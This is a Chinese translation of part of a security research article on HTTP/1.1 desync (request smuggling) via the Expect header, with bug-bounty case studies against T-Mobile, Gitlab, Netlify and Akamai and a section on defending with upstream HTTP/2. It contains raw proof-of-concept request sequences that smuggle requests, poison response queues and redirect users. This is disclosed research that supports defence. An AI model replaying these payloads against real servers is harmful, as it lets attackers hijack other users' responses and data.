仅仅发送一个有效的 Expect 头就会在许多不同的服务器上导致 0.CL 反同步。我相信这是由于前端服务器中一个损坏的 Expect 实现引起的，它正确地转发了头部，但被后端的非 100 回复搞糊涂了，忘记它仍然需要从客户端接收消息体。

以下是我们针对 T-Mobile 一个测试域构建的概念验证：

```http
GET /logout HTTP/1.1
Host: <redacted>.t-mobile.com
Expect: 100-continue
Content-Length: 291

```

```http
HTTP/1.1 404 Not Found
```

```http
GET /logout HTTP/1.1
Host: <redacted>.t-mobile.com
Content-Length: 100

GET / HTTP/1.1
Host: <redacted>.t-mobile.com

GET https://psres.net/assets HTTP/1.1
X: y
```

```http
HTTP/1.1 200 OK
```

```http
GET / HTTP/1.1
Host: <redacted>.t-mobile.com

```

```http
HTTP/1.1 301 Moved Permanently
Location: https://psres.net/…
```

[T-Mobile](https://bugcrowd.com/engagements/t-mobile) 为这个发现奖励了我们 12,000 美元——对于一个非生产域来说，这是一个非常有竞争力的赏金。

### 通过混淆 Expect 实现 0.CL 反同步——Gitlab

发送一个轻微混淆的 Expect 头暴露了大量新目标。例如，`Expect: y 100-continue` 在 h1.sec.gitlab.net 上导致 0.CL 反同步。这是一个有趣的目标，因为它保存了发送给 Gitlab 漏洞赏金计划的报告的附件——潜在的关键零日。

该站点的攻击面很小，因此我们无法找到经典的重定向或 [XSS](/web-security/cross-site-scripting) 反同步小工具来利用。相反，我们选择追求响应队列投毒（RQP）——一种高影响的攻击，导致服务器向每个人发送本应给其他用户的随机响应。RQP 在低流量目标上由于固有的竞争条件而棘手，但我们坚持了下来，在 27,000 个请求之后，我们获得了其他人的漏洞报告视频和 7,000 美元的赏金：

```http
GET / HTTP/1.1
Content-Length: 686
Expect: y 100-continue

```

```http
HTTP/1.1 200 OK
```

```http
GET / HTTP/1.1
Content-Length: 292

GET / HTTP/1.1
Host: h1.sec.gitlab.net

GET / HTTP/1.1
Host: h1.sec.gitlab.net

```

```http
HTTP/1.1 200 OK
```

```http
GET /??? HTTP/1.1
Authorization: ???
User-Agent: Unknown Gitlab employee

```

```http
HTTP/1.1 200 OK
```

```http
GET / HTTP/1.1
Host: h1.sec.gitlab.net

```

```http
HTTP/1.1 302 Found
Location: https://storage<redacted>
```

在此之后，一些高额赏金使我们从基于 0.CL Expect 的反同步攻击中赚取的金额达到约 95,000 美元。

### 通过普通 Expect 实现 CL.0 反同步——Netlify CDN

证明 Expect 可以以各种可能的方式破坏服务器，它也可以导致 CL.0 反同步漏洞。

例如，我们在 Netlify 中发现了一个 CL.0 RQP 漏洞，当触发时，向我们发送来自 Netlify CDN 上每个网站的连续响应流：

```http
POST /images/ HTTP/1.1
Host: <redacted-netlify-client>
Expect: 100-continue
Content-Length: 64

GET /letter-picker HTTP/1.1
Host: <redacted-netlify-client>

```

```http
HTTP/1.1 404 Not Found
```

```http
POST /authenticate HTTP/1.1
Host: ???
User-Agent: Unknown Netlify user

```

```http
HTTP/1.1 200 OK
…
<title>Letter Picker Wheel
```

```http
GET / HTTP/1.1
Host: <redacted-netlify-client>

```

```http
HTTP/1.1 200 OK
…
"{\"token\":\"eyJhbGciOiJ…
```

我们在测试一个特定的 Netlify 托管网站时发现了这一点，但向 Netlify 报告它没有意义，因为我们劫持的响应都来自第三方网站。

攻击在我们发现后不久就停止了工作，但我们仍然向 Netlify 报告了它，并收到了回复“利用 Netlify 的网站超出范围”，没有赏金。通常，当我遇到令人惊讶的赏金结果时，我不会提及它，因为它往往会分散读者对技术内容的注意力。我在这里破例，因为它为接下来发生的事情提供了有用的背景。

### 通过混淆 Expect 实现 CL.0 反同步——Akamai CDN

毫不奇怪，混淆 Expect 头揭示了更多的 CL.0 反同步漏洞。以下是我们发现的一个示例，它让我们能够向访问 auth.lastpass.com 的用户提供任意内容，获得了他们的最高赏金——5,000 美元：

```
OPTIONS /anything HTTP/1.1
Host: auth.lastpass.com
Expect:
 100-continue
Content-Length: 39

GET / HTTP/1.1
Host: www.sky.com
X: X
```

```http
HTTP/1.1 404 Not Found
```

```http
GET /anything HTTP/1.1
Host: auth.lastpass.com

```

```http
HTTP/1.1 200 OK

Discover TV & Broadband Packages with Sky
```

我们很快意识到这影响了大量使用 Akamai CDN 的目标。事实上，我相信我们可以用它来控制可能是互联网上最负盛名的域名——example.com！不幸的是，example.com 没有 VDP，因此验证这一点将是非法的。除非 Akamai 通知我们，否则我们可能永远无法确定。

尽管如此，这引发了一个问题。我们应该直接向受影响的公司报告问题，还是向 Akamai 报告？作为研究人员，与 CDN 及其客户保持良好的关系非常重要，而我获得的任何赏金都捐给了慈善机构，所以我没有个人利益。然而，我可以看到赏金猎人会在没有我帮助的情况下独立发现这个问题，我不想破坏他们的收入。最终，我决定退后一步——我没有参与探索或报告这个问题，也没有从赏金中分成。我有点后悔，因为这最终导致了 74 个单独的赏金，总计 221,000 美元。

这些报告收到了良好的反馈，但事情并不完全顺利。事实证明，该漏洞实际上完全在 Akamai 的基础设施内部，因此 Akamai 被其客户的大量支持工单淹没了。我开始担心该技术可能在 Akamai 仍然存在漏洞时泄露，并联系了 Akamai 以帮助他们更快地修复。该问题被分配了 CVE-2025-32094，我获得了 9,000 美元的赏金。他们能够迅速为一些客户发布热修复，但从那时起完全解决该漏洞仍然花了 65 天。

总的来说，这相当有压力，但至少我获得了一些以美元为后盾的证据，证明 HTTP/1.1 的危险性。目前从这项研究中获得的总赏金略高于 350,000 美元。

## 防御 HTTP 反同步攻击

### 为什么修补 HTTP/1.1 还不够

本文中的所有攻击都是在利用实现缺陷，因此得出结论认为解决方案是放弃整个协议似乎有些奇怪。然而，所有这些攻击都有相同的根本原因。HTTP/1.1 的致命缺陷——请求分离不良——意味着微小的错误通常会产生严重的影响。这被两个关键因素加剧了。

首先，HTTP/1.1 只有在不进行代理时才简单。RFC 包含众多地雷，如指定消息长度的三种不同方式、Expect 和 Connection 等复杂性炸弹，以及 HEAD 等特殊情况。这些都与解析器差异相互作用，创造了无数严重漏洞。

其次，过去六年的经验证明，我们难以应用真正能够解决威胁的那种修补和加固。在前端服务器上应用健壮的验证或规范化会有所帮助，但我们太害怕破坏与遗留客户端的兼容性而不敢这样做。相反，我们诉诸于基于正则表达式的防御，攻击者可以轻松绕过。

所有这些因素结合意味着一件事——更多的反同步攻击即将到来。

### HTTP/2 相比 HTTP/1 有多安全？

HTTP/2 并不完美——它比 HTTP/1 复杂得多，并且实现起来可能很痛苦。然而，上游 HTTP/2+ 使反同步漏洞的可能性大大降低。这是因为 HTTP/2 是一种二进制协议，很像 TCP 和 TLS，每条消息的长度没有任何歧义。您可能会遇到实现错误，但特定错误实际上可被利用的概率要低得多。

迄今为止在 HTTP/2 实现中发现的大多数漏洞都是 DoS 缺陷，如 [HTTP/2 Rapid Reset](https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/)——HTTP/1 也有相当多的此类攻击。对于更严重的漏洞，您通常需要内存安全问题或整数溢出作为根本原因。再次强调，这些问题也影响 HTTP/1.1 实现。当然，总有例外——如 [CVE-2023-32731](https://nvd.nist.gov/vuln/detail/cve-2023-32731) 和 [HTTP/3 连接污染](https://portswigger.net/research/http-3-connection-contamination)——我期待未来看到更多针对这些的研究。

请注意，HTTP/2 降级（前端服务器与客户端使用 HTTP/2 通信，但将其重写为 HTTP/1.1 用于上游通信）提供的安全收益极小，实际上使网站更容易受到反同步攻击。

您可能会遇到一种论点，声称 HTTP/1.1 比 HTTP/2 更安全，因为 HTTP/1.1 实现更古老，因此更坚固。为了反驳这一点，我想将请求走私与缓冲区溢出进行比较。请求走私作为已知威胁大约有六年的历史。这意味着我们对其的防御大约与 2002 年对缓冲区溢出的防御一样成熟。是时候切换到内存安全的语言了。

### 如何使用 HTTP/2 打败请求走私

首先，确保您的源服务器支持 HTTP/2。大多数现代服务器都支持，所以这应该不是问题。

接下来，在您的代理上启用上游 HTTP/2。我已确认以下供应商可以做到这一点：HAProxy、F5 Big-IP、Google Cloud、Imperva、Apache（实验性）和 Cloudflare（但他们在内部使用 HTTP/1）。

不幸的是，以下供应商尚未增加对上游 HTTP/2 的支持：nginx、Akamai、CloudFront、Fastly。尝试提交支持工单询问他们何时启用上游 HTTP/2——希望他们至少能提供一个时间表。另外，查看他们的文档，看看是否可以启用请求规范化——有时有价值的缓解措施是可用的，但默认是禁用的。

请注意，不需要在浏览器和前端之间禁用 HTTP/1。这些连接很少在不同用户之间共享，因此它们危险得多。只需确保它们在上游被转换为 HTTP/2。

### 如何与 HTTP/1 共存的生存策略

如果您目前被困在上游 HTTP/1.1，有一些策略可以用来帮助您的网站在不可避免的未来几轮反同步攻击中生存下来，直到您可以开始使用 HTTP/2：

- 在前端服务器上启用所有可用的规范化和验证选项。
- 在后端服务器上启用验证选项。
- 避免小众 Web 服务器——Apache 和 nginx 风险较低。
- 定期使用 HTTP Request Smuggler 进行扫描。
- 禁用上游连接复用（可能会影响性能）。
- 如果方法不需要消息体，则拒绝带有消息体的请求（GET/HEAD/OPTIONS）。

最后，请警惕供应商声称 WAF 可以像上游 HTTP/2 一样有效地阻止反同步攻击。

### 如何帮助杀死 HTTP/1.1

现在，杀死上游 HTTP/1 的最大障碍是对其危险性的认识不足。希望这项研究能有所帮助，但为了产生持久的影响，确保我们六年后不会处于完全相同的境地，我需要您的帮助。

我们需要共同向世界展示 HTTP/1.1 是多么破烂。试试 HTTP Request Smuggler 3.0，入侵系统并让它们用 HTTP/2 修补。尽可能发布您的发现，以便我们其他人可以从中学习。不要仅仅因为目标修补了方法论就放过它们——调整和定制技术和工具，永远不要满足于当前的技术水平。这并不像您想象的那么难，您绝对不需要多年的研究经验。例如，在结束这项研究时，我意识到去年发表的一篇文章[实际上描述了一个基于 Expect 的 0.CL 反同步](https://mattermost.com/blog/a-dos-bug-thats-worse-than-it-seems/)，因此您本可以通过阅读和应用它来比我先发现这些发现！

最后，传播这个信息——更多的反同步攻击总会到来。

## 结论

在过去的六年里，我们看到 HTTP/1.1 的设计缺陷定期使网站面临严重攻击。试图对个别实现进行热修复的尝试未能跟上威胁的步伐，唯一可行的长期解决方案是上游 HTTP/2。这不是一个快速修复，但通过传播上游 HTTP/1.1 实际上有多危险的认识，我们可以帮助杀死 HTTP/1.1。

祝好运！

James Kettle

---

**标签：** [Request Smuggling](/research/request-smuggling) · [Black Hat](/research/black-hat) · [DEF CON](/research/def-con)

[← 返回所有文章](/research/articles)